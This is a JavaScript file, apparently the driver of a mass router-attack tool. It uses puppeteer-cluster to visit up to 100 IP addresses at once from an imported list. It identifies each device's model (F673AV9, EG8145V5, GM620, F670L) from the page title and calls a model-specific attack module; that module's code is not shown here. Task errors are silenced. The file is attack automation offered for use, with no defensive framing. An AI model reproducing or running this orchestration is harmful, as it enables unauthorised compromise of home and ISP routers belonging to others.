import {Cluster} from "puppeteer-cluster";
import attackZteF673AV9 from "./modelos/modelo-F673AV9.js"
import attackEG8145V5 from "./modelos/modelo-EG8145V5.js"
import {ips} from "./ips.js";
import attackGM620 from "./modelos/modelo-GM620.js";
import attackF670L from "./modelos/modelo-F670L.js";

(async () => {
    const cluster = await Cluster.launch({
        concurrency: Cluster.CONCURRENCY_CONTEXT,
        maxConcurrency: 100,
        monitor: true,
        puppeteerOptions: {
            ignoreHTTPSErrors: true
        }
    });

    await cluster.task(attack)
    cluster.on('taskerror', (err, data) => {
    });

    ips.forEach(ip => {
        cluster.queue(ip)
    });

    await cluster.idle();
    await cluster.close();
})();

async function attack({page, data: ip}) {
    const localpage = page;
    const endereco = `http://${ip}`;

    await localpage.setViewport({
        width: 764,
        height: 928
    })

    await localpage.goto(endereco, {
        waitUntil: 'networkidle2',
        timeout: 5000
    });

    const title = await page.title();
    if (title === "F673AV9") await attackZteF673AV9(page, endereco);
    if (title === "EG8145V5") await attackEG8145V5(page, endereco);
    if (title === "GM620") await attackGM620(page, endereco);
    if (title === "F670L") await attackF670L(page, endereco);

}

